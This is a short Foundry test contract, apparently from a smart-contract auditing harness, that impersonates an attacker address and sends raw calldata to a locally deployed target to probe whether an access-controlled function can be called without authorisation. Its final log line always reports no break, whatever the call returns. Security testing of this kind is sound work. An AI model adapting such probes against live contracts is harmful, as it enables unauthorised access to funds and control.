// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

contract LowkeyBreakAccess is Test {
    address constant TARGET = address(0x5fbdb2315678afecb367f032d93f642f64180aa3);
    address constant ATTACKER = address(0xBEEF000000000000000000000000000000000042);

    function test_break_access() public {
        bytes memory data = hex"fef3a3000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb922660000000000000000000000000000000000000000000000000000000000000000";
        vm.deal(ATTACKER, 100 ether);

        vm.prank(ATTACKER);
        (bool success, bytes memory returndata) = TARGET.call{value: 0}(data);

        console2.log("LOWKEY_BREAK_FAMILY", "access");
        console2.log("SUCCESS", success);
        console2.log("RETURNDATA_LENGTH", returndata.length);
        console2.log("LOWKEY_BREAK", false && success);
    }
}
